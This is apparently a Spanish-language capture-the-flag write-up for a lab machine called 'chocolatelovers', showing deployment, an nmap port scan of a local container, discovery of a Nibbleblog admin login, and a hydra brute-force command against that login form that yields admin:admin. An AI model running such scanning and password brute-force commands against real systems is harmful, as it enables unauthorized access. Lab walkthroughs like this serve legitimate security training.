
**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

**Dificultad:** Fácil

**Fecha de creación:** 26/06/2024

---------------------------------------

DESPLIEGUE

```
sudo bash auto_deploy.sh chocolatelovers.tar
```

![[Pasted image 20241024102816.png]]

La IP es:

```
172.17.0.2
```


----------------------------------------------


RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```

![[Pasted image 20241024102952.png]]

Como tiene un puerto abierto que es el 80, vamos a ponerlos en el navegador, sabiendo que el 80 es protocolo http. 


![[Pasted image 20241024103155.png]]

Miramos el código fuente: 

![[Pasted image 20241024103228.png]]

Accedemos a este subdominio. 

![[Pasted image 20241024103511.png]]

Vemos que hay una ruta, accedemos: 

Y hay un panel de login.

![[Pasted image 20241024103628.png]]


-------------------------------------------

EXPLOTACIÓN

Intentemos hacer fuerza bruta a la máquina. 
Usaremos este parámetro.

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt "http-post-form://172.17.0.2/nibbleblog/admin.php:username=^USER^&password=^PASS^:Invalid username or password"
```


![[Pasted image 20241024104804.png]]

Es admin:admin 

Cuando intento entrar parece que se bloqueó, tendrá una protección ante la fuerza bruta.

![[Pasted image 20241024104945.png]]

